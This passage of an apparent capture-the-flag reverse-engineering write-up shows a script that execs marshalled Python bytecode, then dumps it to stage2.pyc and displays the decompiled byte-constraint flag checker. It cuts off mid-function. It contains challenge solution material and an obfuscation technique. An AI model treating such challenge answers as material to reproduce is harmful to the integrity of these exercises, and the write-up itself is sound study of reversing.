class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">P</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">P</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">F</span><span class="se">\xb7</span><span class="s">M</span><span class="se">\xb1</span><span class="s">M</span><span class="se">\xc0</span><span class="s">#</span><span class="se">\xc0</span><span class="s">z</span><span class="se">\xd0</span><span class="s">RT</span><span class="se">\xd0</span><span class="s">UW</span><span class="se">\xd0</span><span class="s">GX</span><span class="se">\xd3</span><span class="s">4Y</span><span class="se">\xd0</span><span class="s">Z[</span><span class="se">\xd1</span><span class="s">4</span><span class="se">\\\xd1\x08\\\xd4</span><span class="s">`f</span><span class="se">\xd7</span><span class="s">`m</span><span class="se">\xd1</span><span class="s">`m</span><span class="se">\xd0</span><span class="s">nq</span><span class="se">\xd0</span><span class="s">s}</span><span class="se">\xf0\x00\x00\x7f\x01</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">B</span><span class="se">\x02</span><span class="s">D</span><span class="se">\x02\xf0\x00\x00</span><span class="s">t</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf3\x00\x00</span><span class="s">a</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">G</span><span class="se">\x02</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00</span><span class="s">a</span><span class="se">\x01</span><span class="s">I</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">I</span><span class="se">\x02\xf0\x00\x00</span><span class="s">M</span><span class="se">\x02</span><span class="s">O</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">O</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">N</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">N</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">M</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">M</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">O</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">O</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}~</span><span class="se">\xf0\x00\x00</span><span class="s">@</span><span class="se">\x02</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">B</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">D</span><span class="se">\x02</span><span class="s">E</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">J</span><span class="se">\x02</span><span class="s">O</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">O</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">N</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">N</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">O</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">O</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">`f</span><span class="se">\xd7</span><span class="s">`m</span><span class="se">\xd1</span><span class="s">`m</span><span class="se">\xd0</span><span class="s">nq</span><span class="se">\xd0</span><span class="s">s}</span><span class="se">\xf0\x00\x00\x7f\x01</span><span class="s">A</span><span class="se">\x02\xf0\x00\x00</span><span class="s">B</span><span class="se">\x02</span><span class="s">D</span><span class="se">\x02\xf0\x00\x00</span><span class="s">t</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf3\x00\x00</span><span class="s">a</span><span class="se">\x01</span><span class="s">F</span><span class="se">\x02\xf0\x00\x00</span><span class="s">G</span><span class="se">\x02</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00</span><span class="s">a</span><span class="se">\x01</span><span class="s">I</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">I</span><span class="se">\x02\xf0\x00\x00</span><span class="s">M</span><span class="se">\x02</span><span class="s">O</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">O</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">P</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">P</span><span class="se">\x02\xd8\x0f\x14\xdc\x08\x0e\x8f\r\x89\r\x90</span><span class="s">c</span><span class="se">\x98</span><span class="s">:</span><span class="se">\xa0</span><span class="s">b</span><span class="se">\xa8\x12\xd0\x1b</span><span class="s">,</span><span class="se">\xd3\x08</span><span class="s">-</span><span class="se">\xa8</span><span class="s">a</span><span class="se">\xd1\x08</span><span class="s">0</span><span class="se">\xb4</span><span class="s">6</span><span class="se">\xb7</span><span class="s">=</span><span class="se">\xb1</span><span class="s">=</span><span class="se">\xc0\x13\xc0</span><span class="s">j</span><span class="se">\xd0</span><span class="s">QS</span><span class="se">\xd0</span><span class="s">TV</span><span class="se">\xd0</span><span class="s">FW</span><span class="se">\xd3</span><span class="s">3X</span><span class="se">\xd0</span><span class="s">YZ</span><span class="se">\xd1</span><span class="s">3[</span><span class="se">\xd1\x08</span><span class="s">[</span><span class="se">\xd4</span><span class="s">_e</span><span class="se">\xd7</span><span class="s">_l</span><span class="se">\xd1</span><span class="s">_l</span><span class="se">\xd0</span><span class="s">mp</span><span class="se">\xd0</span><span class="s">r|</span><span class="se">\xd0</span><span class="s">}</span><span class="se">\x7f\xf0\x00\x00</span><span class="s">A</span><span class="se">\x02</span><span class="s">C</span><span class="se">\x02\xf0\x00\x00</span><span class="s">s</span><span class="se">\x01</span><span class="s">D</span><span class="se">\x02\xf3\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">E</span><span class="se">\x02\xf0\x00\x00</span><span class="s">F</span><span class="se">\x02</span><span class="s">G</span><span class="se">\x02\xf1\x00\x00</span><span class="s">`</span><span class="se">\x01</span><span class="s">H</span><span class="se">\x02\xf1\x00\x00\x08</span><span class="s">H</span><span class="se">\x02\xf0\x00\x00</span><span class="s">L</span><span class="se">\x02</span><span class="s">Q</span><span class="se">\x02\xf2\x00\x00\x08</span><span class="s">Q</span><span class="se">\x02\xd8\x0f\x14\xe0\x0b\x0f\xf3\x00\x00\x00\x00</span><span class="s">)</span><span class="se">\x03</span><span class="s">r/</span><span class="se">\x00\x00\x00\xda\x04</span><span class="s">boolr4</span><span class="se">\x00\x00\x00\xa9\x00</span><span class="s">r5</span><span class="se">\x00\x00\x00</span><span class="s">r3</span><span class="se">\x00\x00\x00\xfa\x08</span><span class="s">&lt;module&gt;r8</span><span class="se">\x00\x00\x00\x01\x00\x00\x00</span><span class="s">s</span><span class="se">\x14\x00\x00\x00\xf0\x03\x01\x01\x01\xdb\x00\r\xf0\x04</span><span class="s">?</span><span class="se">\x01\x10\x98\x04\xf4\x00</span><span class="s">?</span><span class="se">\x01\x10</span><span class="s">r5</span><span class="se">\x00\x00\x00</span><span class="s">'</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">marshal</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
<span class="n">module</span> <span class="o">=</span> <span class="n">types</span><span class="p">.</span><span class="n">ModuleType</span><span class="p">(</span><span class="s">'check_flag'</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">[</span><span class="s">'check_flag'</span><span class="p">]</span> <span class="o">=</span> <span class="n">module</span>
<span class="k">exec</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">module</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>
<span class="kn">import</span> <span class="nn">check_flag</span>
<span class="n">t</span> <span class="o">=</span> <span class="n">check_flag</span><span class="p">.</span><span class="n">check_flag</span><span class="p">(</span><span class="s">'flag{FAKEEEEE_FLAG}'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"flag is </span><span class="si">{</span><span class="p">(</span><span class="s">'correct'</span> <span class="k">if</span> <span class="n">t</span> <span class="k">else</span> <span class="s">'not correct'</span><span class="p">)</span><span class="si">}</span><span class="s">0"</span><span class="p">)</span>
</code></pre></div></div>

<p>To get the stage2 of the payload we have to save the <code class="language-plaintext highlighter-rouge">b</code> content. So, modify the script, to do this</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"stage2.pyc"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</code></pre></div></div>

<p>Upload <code class="language-plaintext highlighter-rouge">stage2.pyc</code> and you should get something like</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>

<span class="k">def</span> <span class="nf">check_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
    <span class="n">flag_bytes</span> <span class="o">=</span> <span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_bytes</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">29</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">210</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">3</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">11</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">3</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">5</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">12669</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">5</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">112</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">7</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">!=</span> <span class="mi">41</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">7</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">!=</span> <span class="mi">474</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
